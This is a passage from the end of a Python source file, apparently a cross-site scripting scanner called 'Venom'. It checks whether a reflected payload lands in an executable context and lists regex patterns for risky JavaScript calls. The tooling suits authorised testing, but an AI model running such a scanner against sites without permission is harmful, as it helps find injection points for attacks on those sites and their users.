                elif attr in ['href', 'src', 'data', 'content'] and 'javascript:' in value.lower() and payload in value:
                    return True, f"Inside {attr} attribute (javascript:)"
                elif attr == 'srcdoc' and payload in value:
                    return True, "Inside iframe srcdoc (potential sandbox bypass)"
                elif attr == 'innerHTML' and payload in value:
                    return True, "Inside innerHTML (high-risk DOM injection)"

        meta_tags = soup.find_all('meta', attrs={'http-equiv': 'refresh'})
        for meta in meta_tags:
            if payload in meta.get('content', ''):
                return True, "Inside meta refresh (potential sandbox bypass)"

        obscure_tags = ['isindex', 'keygen', 'base', 'input']
        for tag in soup.find_all(obscure_tags):
            if payload in str(tag):
                return True, f"Inside {tag.name} tag (potential sanitizer bypass)"

        # Check for template engine patterns (e.g., Handlebars, AngularJS)
        if any(pattern in response_text for pattern in ['{{', '}}', 'ng-', 'ng-app', 'ng-bind']):
            return True, "Inside template engine context (potential injection)"

        if any(c in payload for c in '<>"\'') and payload in response_text:
            return True, "Unescaped in HTML (potential injection)"

        logging.debug(f"Payload '{payload}' found but not in executable context")
        return False, "Reflected but not executable"

    # Expanded executable patterns to include high-risk functions
    executable_patterns = [
        r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']',
        r'srcdoc\s*=\s*["\'][^"\']+["\']', r'http-equiv\s*=\s*["\']refresh["\']',
        r'eval\(.+\)', r'settimeout\(.+\)', r'innerhtml\s*=\s*["\'][^"\']+["\']',
        r'document\.write\(.+\)', r'postmessage\(.+\)'
    ]
    for pattern in executable_patterns:
        matches = re.findall(pattern, payload, re.IGNORECASE)
        for match in matches:
            if match in response_text and html.escape(match) != match:
                script_tags = soup.find_all('script')
                for script in script_tags:
                    if match in script.get_text() and not script.get('src'):
                        return True, "Inside <script> tag (executable portion)"
                for tag in soup.find_all(True):
                    for attr, value in tag.attrs.items():
                        if attr.startswith('on') and match in str(value):
                            return True, f"Inside event handler ({attr}) (executable portion)"
                        elif attr in ['href', 'src', 'data', 'content', 'srcdoc'] and 'javascript:' in value.lower() and match in value:
                            return True, f"Inside {attr} attribute (javascript:) (executable portion)"
                        elif attr == 'srcdoc' and match in value:
                            return True, "Inside iframe srcdoc (executable portion)"
                for tag in soup.find_all(['isindex', 'keygen', 'base', 'input']):
                    if match in str(tag):
                        return True, f"Inside {tag.name} tag (potential sanitizer bypass)"
                if any(c in match for c in '<>"\'') and match in response_text:
                    return True, "Unescaped in HTML (executable portion)"
                logging.debug(f"Executable portion '{match}' found but not in executable context")
                return False, "Executable portion reflected but not executable"

    # Check for reflection in LocalStorage/SessionStorage (simulated check)
    if 'localstorage' in response_text.lower() or 'sessionstorage' in response_text.lower():
        return True, "Potential DOM-based XSS in LocalStorage/SessionStorage"

    logging.debug(f"Payload '{payload}' not reflected or not executable")
    return False, "Not reflected or not executable"

if __name__ == "__main__":
    args = parse_args()
    venom = Venom(args)
    venom.run()
